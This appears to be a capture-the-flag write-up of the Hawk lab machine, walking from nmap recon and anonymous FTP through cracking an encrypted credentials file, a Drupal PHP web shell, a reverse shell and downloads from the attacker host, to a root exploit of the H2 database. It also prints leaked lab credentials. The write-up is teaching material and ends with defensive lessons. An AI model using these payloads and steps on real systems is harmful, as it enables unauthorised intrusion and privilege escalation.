# Hawk Writeup w/o Metasploit

![](https://miro.medium.com/max/590/1*iRL9RMIX8wPn3TOC6R3TjQ.png)

## Reconnaissance <a id="2df8"></a>

Run the [nmapAutomato](https://github.com/rkhal101/nmapAutomator)r script to enumerate open ports and services running on those ports.

```text
./nmapAutomator.sh 10.10.10.102 All
```

* **All**: Runs all the scans consecutively.

We get back the following result.

```text
Running all scans on 10.10.10.102Host is likely running Linux---------------------Starting Nmap Quick Scan---------------------Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-24 14:52 EST
Nmap scan report for 10.10.10.102
Host is up (0.039s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
8082/tcp open  blackice-alertsNmap done: 1 IP address (1 host up) scanned in 0.78 seconds---------------------Starting Nmap Basic Scan---------------------Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-24 14:52 EST
Nmap scan report for 10.10.10.102
Host is up (0.031s latency).PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Jun 16  2018 messages
| ftp-syst: 
|   STAT:                                                                                                                                                                      
| FTP server status:                                                                                                                                                           
|      Connected to ::ffff:10.10.14.12                                                                                                                                         
|      Logged in as ftp                                                                                                                                                        
|      TYPE: ASCII                                                                                                                                                             
|      No session bandwidth limit                                                                                                                                              
|      Session timeout in seconds is 300                                                                                                                                       
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e4:0c:cb:c5:a5:91:78:ea:54:96:af:4d:03:e4:fc:88 (RSA)
|   256 95:cb:f8:c7:35:5e:af:a9:44:8b:17:59:4d:db:5a:df (ECDSA)
|_  256 4a:0b:2e:f7:1d:99:bc:c7:d3:0b:91:53:b9:3b:e2:79 (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: Drupal 7 (http://drupal.org)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Welcome to 192.168.56.103 | 192.168.56.103
8082/tcp open  http    H2 database http console
|_http-title: H2 Console
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.22 seconds----------------------Starting Nmap UDP Scan----------------------
                                                                                                                                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-24 14:52 EST
Warning: 10.10.10.102 giving up on port because retransmission cap hit (1).
Nmap scan report for 10.10.10.102
Host is up (0.032s latency).
Not shown: 969 open|filtered ports, 30 closed ports
PORT    STATE SERVICE
161/udp open  snmpNmap done: 1 IP address (1 host up) scanned in 25.34 secondsMaking a script scan on UDP ports: 161
                                                                                                                                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-24 14:53 EST
Nmap scan report for 10.10.10.102
Host is up (0.034s latency).PORT    STATE SERVICE VERSION
161/udp open  snmp    net-snmp; net-snmp SNMPv3 server
| snmp-info: 
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   engineIDData: f438a676ed23245b00000000
|   snmpEngineBoots: 21
|_  snmpEngineTime: 50m38sService detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 5.79 seconds---------------------Starting Nmap Full Scan----------------------
                                                                                                                                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-24 14:53 EST
Initiating Parallel DNS resolution of 1 host. at 14:53
Completed Parallel DNS resolution of 1 host. at 14:53, 0.01s elapsed
Initiating SYN Stealth Scan at 14:53
Scanning 10.10.10.102 [65535 ports]
Discovered open port 21/tcp on 10.10.10.102
Discovered open port 80/tcp on 10.10.10.102
Discovered open port 22/tcp on 10.10.10.102
Discovered open port 9092/tcp on 10.10.10.102
SYN Stealth Scan Timing: About 23.17% done; ETC: 14:55 (0:01:43 remaining)
Discovered open port 5435/tcp on 10.10.10.102
SYN Stealth Scan Timing: About 46.06% done; ETC: 14:55 (0:01:11 remaining)
Discovered open port 8082/tcp on 10.10.10.102
SYN Stealth Scan Timing: About 68.95% done; ETC: 14:55 (0:00:41 remaining)
Completed SYN Stealth Scan at 14:55, 131.10s elapsed (65535 total ports)
Nmap scan report for 10.10.10.102
Host is up (0.034s latency).
Not shown: 65529 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
5435/tcp open  sceanics
8082/tcp open  blackice-alerts
9092/tcp open  XmlIpcRegSvcRead data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 131.26 seconds
           Raw packets sent: 65535 (2.884MB) | Rcvd: 65535 (2.621MB)Making a script scan on extra ports: 5435, 9092
                                                                                                                                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-24 14:55 EST
/usr/local/bin/nmapAutomator.sh: line 188:  3745 Segmentation fault      $nmapType -sCV -p$(echo "${extraPorts}") -oN nmap/Full_"$1".nmap "$1"---------------------Starting Nmap Vulns Scan---------------------
                                                                                                                                                                               
Running CVE scan on all ports
                                                                                                                                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-24 14:55 EST
/usr/local/bin/nmapAutomator.sh: line 226:  3773 Segmentation fault      $nmapType -sV --script vulners --script-args mincvss=7.0 -p$(echo "${ports}") -oN nmap/CVEs_"$1".nmap "$1"Running Vuln scan on all ports
                                                                                                                                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-24 14:55 EST
Nmap scan report for 10.10.10.102
Host is up (0.031s latency).PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
....
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /rss.xml: RSS or Atom feed
|   /robots.txt: Robots file
|   /UPGRADE.txt: Drupal file
|   /INSTALL.txt: Drupal file
|   /INSTALL.mysql.txt: Drupal file
|   /INSTALL.pgsql.txt: Drupal file
|   /CHANGELOG.txt: Drupal v1
...
8082/tcp open  http    H2 database http console
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
...
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 530.54 seconds---------------------Recon Recommendations----------------------Web Servers Recon:
                                                                                                                                                                               
gobuster dir -w /usr/share/wordlists/dirb/common.txt -l -t 30 -e -k -x .html,.php -u http://10.10.10.102:80 -o recon/gobuster_10.10.10.102_80.txt
nikto -host 10.10.10.102:80 | tee recon/nikto_10.10.10.102_80.txtgobuster dir -w /usr/share/wordlists/dirb/common.txt -l -t 30 -e -k -x .html,.php -u http://10.10.10.102:8082 -o recon/gobuster_10.10.10.102_8082.txt
nikto -host 10.10.10.102:8082 | tee recon/nikto_10.10.10.102_8082.txtCMS Recon:
                                                                                                                                                                               
droopescan scan drupal -u 10.10.10.102:80 | tee recon/droopescan_10.10.10.102_80.txtSNMP Recon:
                                                                                                                                                                               
snmp-check 10.10.10.102 -c public | tee recon/snmpcheck_10.10.10.102.txt
snmpwalk -Os -c public -v 10.10.10.102 | tee recon/snmpwalk_10.10.10.102.txtWhich commands would you like to run?                                                                                                                                          
All (Default), droopescan, gobuster, nikto, snmp-check, snmpwalk, Skip <!>Running Default in (1) s:---------------------Running Recon Commands----------------------....
                                                                                                                                                                               
Starting droopescan scan
                                                                                                                                                                               
[+] Themes found:                                                               
    seven http://10.10.10.102:80/themes/seven/
    garland http://10.10.10.102:80/themes/garland/[+] Possible interesting urls found:
    Default changelog file - http://10.10.10.102:80/CHANGELOG.txt
    Default admin - http://10.10.10.102:80/user/login[+] Possible version(s):
    7.58[+] Plugins found:
    image http://10.10.10.102:80/modules/image/
    profile http://10.10.10.102:80/modules/profile/
    php http://10.10.10.102:80/modules/php/[+] Scan finished (0:01:31.018523 elapsed)Finished droopescan scan
                                                                                                                                                                               
=========================
```

**Note:** This scan generates a lot of results. I only show the results that contributed to rooting this machine.

We have seven ports open.

* **Port 21:** running vsftpd 3.0.3
* **Port 22:** running OpenSSH 7.6p1
* **Port 80:** running Apache httpd 2.4.29
* **Port 8082:** running H2 database http console
* **Port 5435:** running sceanics
* **Port 9092:** running XmlIpcRegSvc
* **Port 161:** running SNMPv3

Before we move on to enumeration, let’s make some mental notes about the scan results.

* The vsftpd version running is not associated with any critical vulnerabilities. However, anonymous login is allowed and the nmap scan shows that there is a _messages_ directory that we have read and execute permissions to.
* The OpenSSH version that is running on port 22 is not associated with any critical vulnerabilities, so it’s unlikely that we gain initial access through this port, unless we find credentials.
* Port 80 is running Drupal 7 which is an off-the-shelf software. Since it’s not a custom software, this won’t be a custom exploit. However, before we run searchsploit on it, notice that droopscan reported a php plugin. So we’ll probably just need to find credentials and we’ll have code execution.
* Port 8082 is running the H2 database http console.
* I’m not sure what ports 5435 and 9092 are for.

## Enumeration <a id="a375"></a>

I always start off with enumerating HTTP.

**Port 80 HTTP**

Visit the web application in the browser.

![](https://miro.medium.com/max/1183/1*i7wvwJy_oQBm_63Hd2o8-Q.png)

It’s running Drupal which is is a free and open-source content management framework. Let’s look at the _CHANGELOG_ to view the exact version.

![](https://miro.medium.com/max/607/1*eeW-Qk1WYs7EdvIxBgM4tg.png)

It’s running Drupal 7.58.

Let’s try and find credentials to this application. I googled “default credentials drupal”, but I didn’t find anything useful. Next, I tried common credentials _admin/admin_, _admin/password_, etc. but was able to log in.

When it is an off-the-shelf software, I usually don’t run a brute force attack on it because it probably has a lock out policy in place. So for now let’s move on to enumerating the next port.

**Port 21 FTP**

Log into FTP with the username _anonymous_.

```text
root@kali:~# ftp 10.10.10.102
Connected to 10.10.10.102.
220 (vsFTPd 3.0.3)
Name (10.10.10.102:root): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```

Enumerate directories and files.

```text
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Jun 16  2018 messages
226 Directory send OK.ftp> cd messages
250 Directory successfully changed.ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Jun 16  2018 .
drwxr-xr-x    3 ftp      ftp          4096 Jun 16  2018 ..
-rw-r--r--    1 ftp      ftp           240 Jun 16  2018 .drupal.txt.enc
226 Directory send OK.
```

Let’s transfer the _.drupal.txt.enc_ file to our attack machine.

```text
ftp> get .drupal.txt.enc 
local: .drupal.txt.enc remote: .drupal.txt.enc
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for .drupal.txt.enc (240 bytes).
226 Transfer complete.
240 bytes received in 0.00 secs (1.3154 MB/s)
```

Before we look into the file, let’s test if we’re allowed to upload files.

```text
ftp> put test.txt
local: test.txt remote: test.txt
200 PORT command successful. Consider using PASV.
550 Permission denied.
```

We don’t have permission to do that. Let’s go back to the file we found and determine its content type.

```text
root@kali:~/Desktop/htb/hawk# file .drupal.txt.enc 
.drupal.txt.enc: openssl enc'd data with salted password, base64 encoded
```

It’s an openssl encrypted file with a salted password that is base64 encoded. Let’s first decode it and save it in a file.

```text
cat .drupal.txt.enc | base64 --decode > drupal.txt.enc.decoded
```

Now we need to try and crack the password used to encrypt the file. After a bit of googling, I found [this tool](https://manpages.debian.org/testing/bruteforce-salted-openssl/bruteforce-salted-openssl.1.en.html). It’s not installed by default on Kali. To install it, run the following command.

```text
sudo apt-get install bruteforce-salted-openssl
```

We don’t really know the cipher and digest that is being used to encrypt this file, so this will be a trial and error process. However, I’m sure there is a smarter way of doing this.

Let’s first just run the command with the default parameters on the file.

```text
bruteforce-salted-openssl -f /usr/share/wordlists/rockyou.txt drupal.txt.enc.decoded
```

* **-f:** password list

We get the following result.

```text
Warning: using dictionary mode, ignoring options -b, -e, -l, -m and -s.Tried passwords: 14344391
Tried passwords per second: 434678.515152
Last tried password: *7¡Vamos!Password not found.
The file might have been encrypted with a different cipher or/and a
different digest (e.g. OpenSSL 1.0.x uses the MD5 digest by default
but OpenSSL 1.1.x uses SHA256 by default).
```

It doesn’t find the password. The default digest that the program uses is _md5_. Let’s change it to _sha256_.

```text
bruteforce-salted-openssl -d sha256 -f /usr/share/wordlists/rockyou.txt drupal.txt.enc.decoded
```

We get a password!

```text
Warning: using dictionary mode, ignoring options -b, -e, -l, -m and -s.Tried passwords: 30
Tried passwords per second: inf
Last tried password: friendsPassword candidate: friends
```

Perfect! Now I know that the digest is _SHA256_ and cipher used is _AES-256-CBC_ because that’s the default cipher that the program uses if it’s not specified.

Let’s decrypt the file.

```text
openssl aes-256-cbc -d -in drupal.txt.enc.decoded -out drupal.txt
```

Output the content of the decrypted file.

```text
root@kali:~/Desktop/htb/hawk# cat drupal.txt
Daniel,Following the password for the portal:PencilKeyboardScanner123Please let us know when the portal is ready.Kind Regards,IT department
```

We have a possible username “_Daniel_” and a password “_PencilKeyboardScanner123_”. Let’s go back to the Drupal application and test out the credentials.

We get the following error.

![](https://miro.medium.com/max/985/1*eJgK634h4kHKmzIboiZ0eA.png)

It doesn’t tell us whether the username is incorrect or the password is incorrect. So let’s visit the “_Request new password_” link and enumerate usernames from there.

![](https://miro.medium.com/max/987/1*n1cof7iZPg-87Lb9nVqyjw.png)

_Daniel_ is definitely not a username that exists in the system. I tried _admin_, and I get a different error that indicates _admin_ is a user of the system! Let’s try the password on the _admin_ username.

![](https://miro.medium.com/max/1412/1*8Nb9hf36bCY9KSzvouXNjg.png)

We’re in!

## Initial Foothold <a id="cd9a"></a>

In the droopescan results, we saw that the PHP plugin is installed. This means that we can run PHP code. Let’s check if the plugin is enabled.

Visit the _Modules_ tab and enable the _PHP filter_ option. Then save the configuration.

![](https://miro.medium.com/max/1306/1*M2ZRBoAvehIjl6ZfYDq5Bw.png)

Click on the _Add new content_ link on the index page. Then select _Article_. In the _Title_ and _Tags_ field add any random value and in the _Body_ field add the following PHP code.

```text
<?php system($_GET['cmd']); ?>
```

The above code adds a ‘_cmd_’ parameter to the request that can execute system commands.

Change the _Text format_ to _PHP code_ and click _Save_. Then add the _cmd_ parameter to the URL and run the _whoami_ command.

![](https://miro.medium.com/max/1124/1*FCuybgYOf6N431WYPS7Nnw.png)

We have code execution! Let’s intercept the request in Burp and send it to Repeater. Then change the _cmd_ parameter to a reverse shell from [pentestmonkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet). Don’t forget to URL encode it \(Ctrl+U\).

![](https://miro.medium.com/max/693/1*oSlSUAsitdlHv5OfWKmP7g.png)

Set up a listener on the attack machine to receive the reverse shell.

```text
nc -nlvp 1234
```

Send the request in Burp.

![](https://miro.medium.com/max/966/1*W5JimPWX2zt9VZTQW28n5g.png)

We get a shell! Let’s upgrade it to a better shell.

```text
python3  -c 'import pty; pty.spawn("/bin/bash")'
```

This gives us a partially interactive bash shell. To get a fully interactive shell, background the session \(CTRL+ Z\) and run the following in your terminal which tells your terminal to pass keyboard shortcuts to the shell.

```text
stty raw -echo
```

Once that is done, run the command “fg” to bring netcat back to the foreground. Then use the following command to give the shell the ability to clear the screen.

```text
export TERM=xterm
```

Let’s see if we can view the _user.txt_ flag.

![](https://miro.medium.com/max/722/1*4R6GVJPy9Wi6IMgJdn0M1w.png)

Now we need to escalate privileges.

## Privilege Escalation <a id="a8b3"></a>

Let’s transfer the LinEnum script from our attack machine to the target machine.

In the attack machine, start up a server in the same directory that the script resides in.

```text
python -m SimpleHTTPServer 5555
```

In the target machine, change to the /tmp directory where we have write privileges and download the LinEnum script.

```text
cd /tmp
wget http://10.10.14.12:5555/LinEnum.sh
```

Give it execute privileges.

```text
chmod +x LinEnum.sh
```

Run the script.

```text
./LinEnum.sh
```

An interesting process does pop up.

```text
root        815  0.0  0.0   4628   812 ?        Ss   00:45   0:00 /bin/sh -c /usr/bin/java -jar /opt/h2/bin/h2-1.4.196.jar
```

The H2 database is run with root privileges. Let’s check access to the _/opt/h2_ directory.

```text
www-data@hawk:/tmp$ ls -la /opt | grep h2
drwxrwx---  8 1000 1004 4096 Jun 11  2018 h2
```

We don’t have permissions to enter the directory. However, the H2 database was running on port 8082, so let’s view it in the browser.

![](https://miro.medium.com/max/968/1*FJ8I2NVjnuhySnTbmR9NdA.png)

It only allows local connections. At this point I googled “H2 exploit” and found the following [exploit](https://www.exploit-db.com/exploits/45506).

![](https://miro.medium.com/max/843/1*GU1XoPIk1p4U6H9SPU8Bkg.png)

The vulnerability seems to be with the fact that you can create a new database without having authentication credentials. When the new database is created the default credentials are created and the attacker is automatically logged in. From there you can execute Java commands and get arbitrary code execution on the box. Since the H2 database is running with root privileges, our code will execute with root privileges.

Let’s download the exploit.

```text
searchsploit -m 45506
```

Set up an HTTP server where the script resides.

```text
python -m SimpleHTTPServer 5555
```

Then download the script in the target machine.

```text
wget http://10.10.14.12:5555/45506.py
```

Run the script.

```text
www-data@hawk:/tmp$ python3 45506.py -H 127.0.0.1:8082
[*] Attempting to create database
[+] Created database and logged in
[*] Sending stage 1
[+] Shell succeeded - ^c or quit to exit
h2-shell$ whoami
root
```

We are root! Grab the _root.txt_ flag.

![](https://miro.medium.com/max/585/1*vSyn2AqVgzcDQBYUF-F_7Q.png)

## Extra Content <a id="0ffe"></a>

After rooting the machine, I watched [ippsec’s video](https://www.youtube.com/watch?v=UGd9JE1ZXUI) and discovered two things that I did differently.

**Own the user Daniel**

It turns out the _settings.php_ file for the Drupal application contained credentials to the database.

```text
www-data@hawk:/tmp$ cat /var/www/html/sites/default/settings.php...
$databases = array (
  'default' => 
  array (
    'default' => 
    array (
      'database' => 'drupal',
      'username' => 'drupal',
      'password' => 'drupal4hawk',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',
    ),
  ),
);
...
```

Daniel, like many users, reused these credentials for his SSH account.

```text
ssh daniel@10.10.10.102
```

![](https://miro.medium.com/max/701/1*37iDn59gfMAgOfU9EQqSnA.png)

This gives us a python shell, instead of a normal bash shell. To break out of the shell, run the following code.

```text
import os
os.system("/bin/bash")
```

The above code simply invokes a bash shell.

![](https://miro.medium.com/max/496/1*64wKMZ73ejhrp7blRbwOQQ.png)

**Manual Exploitation of the H2 Database**

I exploited the H2 database vulnerability using a script I found on exploitdb. Here, I’ll show you how to do it manually.

We can only access the database locally so we’ll need to use port forwarding in order to access it on our attack machine.

```text
# ssh -L [local-port]:[remote-ip]:[remote-port]
ssh -L 5000:127.0.0.1:8082 daniel@10.10.10.102
```

The above command allocates a socket to listen to port 5000 on localhost from my attack machine \(kali\). Whenever a connection is made to port 5000, the connection is forwarded over a secure channel and is made to port 8082 on localhost on the target machine \(hawk\).

We can verify that the command worked using netstat.

```text
root@kali:~# netstat -an | grep LIST
tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:5555            0.0.0.0:*               LISTEN
```

Now that port forwarding is set, let’s connect to the H2 database using a browser on the attack machine.

```text
http://127.0.01:5000
```

It worked.

![](https://miro.medium.com/max/874/1*Mea5L4Ca96QKl90uhmttSA.png)

We don’t actually have to exploit the vulnerability that automatically logs us in, since we already found credentials in the _settings.php_ file.

![](https://miro.medium.com/max/571/1*5jSoZetEw1t0JWLcwGX6qg.png)

Now we can execute SQL code. [This blog](https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html) explains how when testing the database, the user was able to use the CREATE ALIAS function to execute arbitrary commands on the target system.

![](https://miro.medium.com/max/796/1*F6tM2tvKkdNT47ABZIJokg.png)

This is similar to what the python script was doing, however, it’s always good to try and do things manually so that you can verify that you properly understand how the exploit works.

## Lessons Learned <a id="12f8"></a>

To gain an initial foothold on the box we exploited two vulnerabilities.

1. Insecure configuration of FTP server that allowed anonymous login. The administrator should have disabled anonymous access to the FTP server.
2. Cleartext credentials and reuse of default credentials. After anonymously logging into FTP, we found a message that contained default credentials to the Drupal admin account. Sensitive information should not be sent in cleartext whether at rest or in transit. If it was necessary that the credentials get communicated in this way, the administrator should have at least changed the credentials upon the first login.

To escalate privileges we exploited one vulnerability.

1. Remote Code Execution vulnerability associated with the H2 database that was running on the target machine. Since the database was being run with root privileges, we were able to escalate our privileges to root. The administrator should have updated and patched the system when the vulnerability was publicly disclosed and a security update was made available.

